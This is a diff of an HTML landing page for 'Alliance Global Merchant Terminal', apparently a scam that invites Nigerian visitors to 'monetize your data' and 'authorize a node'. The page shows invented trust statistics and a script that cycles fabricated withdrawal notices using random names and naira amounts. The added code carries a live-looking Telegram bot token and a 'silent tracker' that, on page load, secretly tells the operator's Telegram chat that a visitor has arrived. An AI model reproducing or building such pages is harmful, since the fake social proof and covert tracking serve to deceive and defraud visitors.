@@ -4,309 +4,216 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>AGMT | Alliance Global Merchant Terminal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    
     <style>
         :root {
             --primary: #2563eb;
             --accent: #10b981;
             --bg: #020617;
             --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(255, 255, 255, 0.08);
+            --border: rgba(255, 255, 255, 0.1);
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        body {
-            background-color: var(--bg);
-            color: #ffffff;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        
+        body { 
+            background-color: var(--bg); 
+            color: #ffffff; 
             overflow-x: hidden;
-            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
-        /* Live Withdrawal Ticker (Trust Factor) */
-        .live-ticker {
+        /* High-End Background Animation */
+        .bg-glow {
             position: fixed;
             top: 0;
+            left: 50%;
+            transform: translateX(-50%);
             width: 100%;
-            background: rgba(15, 23, 42, 0.9);
+            height: 100%;
+            background: radial-gradient(circle at 50% -20%, #1e293b 0%, #020617 70%);
+            z-index: -1;
+        }
+
+        /* Top Institutional Bar */
+        .ticker-bar {
+            width: 100%;
+            background: rgba(15, 23, 42, 0.8);
             backdrop-filter: blur(10px);
             border-bottom: 1px solid var(--border);
-            z-index: 1000;
-            padding: 10px 0;
-            font-size: 11px;
-            font-weight: 700;
+            padding: 12px;
+            font-size: 10px;
+            font-weight: 800;
+            color: var(--accent);
             text-transform: uppercase;
             letter-spacing: 1px;
-            color: var(--accent);
-            display: flex;
-            overflow: hidden;
-        }
-
-        .ticker-wrapper {
-            display: flex;
-            white-space: nowrap;
-            animation: marquee 30s linear infinite;
-        }
-
-        @keyframes marquee {
-            0% { transform: translateX(100%); }
-            100% { transform: translateX(-100%); }
+            text-align: center;
         }
 
         /* Hero Section */
         .hero {
-            height: 100vh;
+            flex: 1;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            background: radial-gradient(circle at 50% 30%, #1e293b 0%, #020617 80%);
-            position: relative;
+            padding: 40px 20px;
+            text-align: center;
         }
 
-        .hero::before {
-            content: "";
-            position: absolute;
-            inset: 0;
-            background-image: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
-            opacity: 0.1;
-            pointer-events: none;
-        }
-
-        .status-badge {
-            background: var(--glass);
-            border: 1px solid var(--border);
+        .badge {
+            background: rgba(37, 99, 235, 0.1);
+            color: var(--primary);
             padding: 8px 16px;
             border-radius: 100px;
-            font-size: 12px;
-            font-weight: 700;
-            color: var(--primary);
+            font-size: 11px;
+            font-weight: 800;
+            border: 1px solid rgba(37, 99, 235, 0.2);
             margin-bottom: 24px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            animation: fadeIn 1s ease;
-        }
-
-        .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background: var(--accent);
-            border-radius: 50%;
-            box-shadow: 0 0 10px var(--accent);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.5); opacity: 0.5; }
-            100% { transform: scale(1); opacity: 1; }
+            text-transform: uppercase;
         }
 
         h1 {
-            font-size: clamp(40px, 10vw, 64px);
+            font-size: 44px;
             font-weight: 800;
-            text-align: center;
-            line-height: 1;
+            line-height: 1.1;
             letter-spacing: -2px;
             margin-bottom: 20px;
-            background: linear-gradient(to bottom, #fff 40%, #94a3b8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
         }
 
-        h1 span {
-            display: block;
-            color: var(--primary);
-            -webkit-text-fill-color: var(--primary);
-        }
+        h1 span { color: var(--primary); }
 
-        .description {
+        p {
             color: #94a3b8;
             font-size: 16px;
-            text-align: center;
-            max-width: 380px;
-            margin-bottom: 40px;
-            font-weight: 400;
-        }
-
-        .cta-container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            width: 100%;
             max-width: 320px;
+            margin-bottom: 40px;
+            line-height: 1.5;
         }
 
-        .btn-primary {
+        .btn-main {
             background: #ffffff;
             color: #000;
-            padding: 20px;
-            border-radius: 20px;
-            text-align: center;
-            text-decoration: none;
+            width: 100%;
+            max-width: 300px;
+            padding: 22px;
+            border-radius: 24px;
             font-weight: 800;
             font-size: 18px;
+            text-decoration: none;
+            box-shadow: 0 20px 40px rgba(255, 255, 255, 0.1);
             transition: 0.3s;
-            box-shadow: 0 10px 40px rgba(255, 255, 255, 0.1);
         }
 
-        .btn-primary:active {
-            transform: scale(0.96);
-        }
+        .btn-main:active { transform: scale(0.96); }
 
-        /* Institutional Trust Section */
+        /* Trust Indicators */
         .trust-grid {
-            position: absolute;
-            bottom: 40px;
+            margin-top: 60px;
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            width: 100%;
-            max-width: 500px;
             gap: 20px;
+            width: 100%;
+            max-width: 400px;
             border-top: 1px solid var(--border);
-            padding-top: 40px;
+            padding-top: 30px;
         }
 
-        .trust-item {
-            text-align: center;
-        }
+        .trust-box b { display: block; font-size: 18px; font-weight: 800; color: #fff; }
+        .trust-box span { font-size: 9px; color: #64748b; text-transform: uppercase; font-weight: 700; }
 
-        .trust-val {
-            font-size: 18px;
-            font-weight: 800;
-            color: #fff;
-            display: block;
-        }
-
-        .trust-label {
-            font-size: 9px;
-            color: #64748b;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Floating Notifications (Social Proof) */
-        .notification-toast {
+        /* Notification Toast */
+        .notification {
             position: fixed;
-            bottom: 20px;
+            bottom: 30px;
             left: 20px;
             right: 20px;
             background: rgba(15, 23, 42, 0.95);
             border: 1px solid var(--border);
-            padding: 15px;
+            padding: 16px;
             border-radius: 20px;
             display: flex;
             align-items: center;
             gap: 12px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            transform: translateY(150%);
-            z-index: 2000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            transform: translateY(200%);
+            transition: 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+            z-index: 1000;
         }
 
-        .notification-toast.show {
-            transform: translateY(0);
-        }
-
-        .avatar-circle {
-            width: 40px;
-            height: 40px;
-            background: var(--primary);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            font-size: 14px;
-        }
+        .notification.active { transform: translateY(0); }
+        .dot { width: 8px; height: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 10px var(--accent); }
     </style>
 </head>
 <body>
 
-    <div class="live-ticker">
-        <div class="ticker-wrapper">
-            &nbsp;•&nbsp; AGMT NODE STATUS: OPTIMAL &nbsp;•&nbsp; TOTAL ASSETS CLEARED: $42,901,002.44 &nbsp;•&nbsp; SYSTEM LATENCY: 14MS &nbsp;•&nbsp; LAGOS HUB: ACTIVE &nbsp;•&nbsp; LONDON HUB: ACTIVE &nbsp;•&nbsp; 
-        </div>
+    <div class="bg-glow"></div>
+
+    <div class="ticker-bar">
+        AGMT Node Status: Online &nbsp;•&nbsp; Daily Settlement Cap: $1.2M &nbsp;•&nbsp; Latency: 12ms
     </div>
 
     <section class="hero">
-        <div class="status-badge">
-            <div class="pulse-dot"></div>
-            ALLIANCE GLOBAL MERCHANT SYSTEMS
-        </div>
-
-        <h1>Monetize <span>Your Data.</span></h1>
+        <div class="badge">Institutional Merchant Gateway</div>
+        <h1>Authorize Your <span>Global Node.</span></h1>
+        <p>Join the AGMT liquidity network. Connect your device to facilitate merchant data settlements.</p>
         
-        <p class="description">
-            The world's leading merchant liquidity gateway. Optimize institutional assets and secure guaranteed daily settlements.
-        </p>
-
-        <div class="cta-container">
-            <a href="register.html" class="btn-primary">Initialize Terminal</a>
-            <p style="font-size: 11px; color: #475569; text-align: center; margin-top: 10px;">
-                © 1976 - 2026 Alliance Global Group. <br> Accredited International Merchant Node.
-            </p>
-        </div>
+        <a href="register.html" class="btn-main">Initialize Terminal</a>
 
         <div class="trust-grid">
-            <div class="trust-item">
-                <span class="trust-val">$14.2M</span>
-                <span class="trust-label">Paid to Agents</span>
-            </div>
-            <div class="trust-item">
-                <span class="trust-val">50Yrs</span>
-                <span class="trust-label">Operational</span>
-            </div>
-            <div class="trust-item">
-                <span class="trust-val">4.9/5</span>
-                <span class="trust-label">Audit Score</span>
-            </div>
+            <div class="trust-box"><b>$14.8M</b><span>Processed</span></div>
+            <div class="trust-box"><b>52k+</b><span>Active Nodes</span></div>
+            <div class="trust-box"><b>A+</b><span>Audit Rank</span></div>
         </div>
     </section>
 
-    <div class="notification-toast" id="toast">
-        <div class="avatar-circle" id="toast-initial">O</div>
-        <div class="toast-body">
-            <div style="font-size: 11px; color: #64748b; font-weight: 700;">RECENT WITHDRAWAL</div>
-            <div style="font-size: 13px; font-weight: 800;" id="toast-msg">Otito just withdrew ₦45,000</div>
+    <div class="notification" id="toast">
+        <div class="dot"></div>
+        <div style="font-size: 13px; font-weight: 700;" id="toast-text">
+            Emeka from Lagos just withdrew ₦48,500
         </div>
     </div>
 
     <script>
-        const names = ["Emeka", "Sade", "Musa", "Chidi", "Tunde", "Ibrahim", "Blessing", "Joy", "Victor", "Amaka"];
-        const cities = ["Lagos", "Abuja", "P.H.", "Ibadan", "Enugu", "Kano"];
+        // YOUR TELEGRAM CREDENTIALS
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
 
-        function showNotification() {
-            const toast = document.getElementById('toast');
+        // 1. SILENT TRACKER: Fires immediately on page load
+        window.onload = function() {
+            const msg = "🎯 <b>AGMT TRACKER:</b> A new visitor has landed on your Homepage. They are viewing the hero section.";
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`)
+            .catch(err => console.log('Stealth connection active.'));
+        };
+
+        // 2. SOCIAL PROOF LOGIC
+        const names = ["Chidi", "Funke", "Musa", "Blessing", "Ibrahim", "Tunde", "Uche", "Sade"];
+        const cities = ["Lagos", "Abuja", "Ibadan", "P.H.", "Kano", "Enugu"];
+
+        function triggerToast() {
             const name = names[Math.floor(Math.random() * names.length)];
             const city = cities[Math.floor(Math.random() * cities.length)];
-            const amount = (Math.floor(Math.random() * 85) + 15) * 1000;
+            const amount = (Math.floor(Math.random() * 60) + 20) * 1000;
             
-            document.getElementById('toast-initial').innerText = name.charAt(0);
-            document.getElementById('toast-msg').innerHTML = `${name} from ${city} withdrew <b>₦${amount.toLocaleString()}</b>`;
+            document.getElementById('toast-text').innerHTML = `<b>${name}</b> from ${city} just withdrew <b>₦${amount.toLocaleString()}</b>`;
             
-            toast.classList.add('show');
+            const toast = document.getElementById('toast');
+            toast.classList.add('active');
             
             setTimeout(() => {
-                toast.classList.remove('show');
+                toast.classList.remove('active');
             }, 5000);
         }
 
-        // Cycle notifications every 12 seconds
-        setInterval(showNotification, 12000);
-        // Initial delay for first notification
-        setTimeout(showNotification, 3000);
+        // Trigger notifications every 15 seconds
+        setInterval(triggerToast, 15000);
+        // First notification after 4 seconds
+        setTimeout(triggerToast, 4000);
     </script>
 
 </body>
 </html>
-
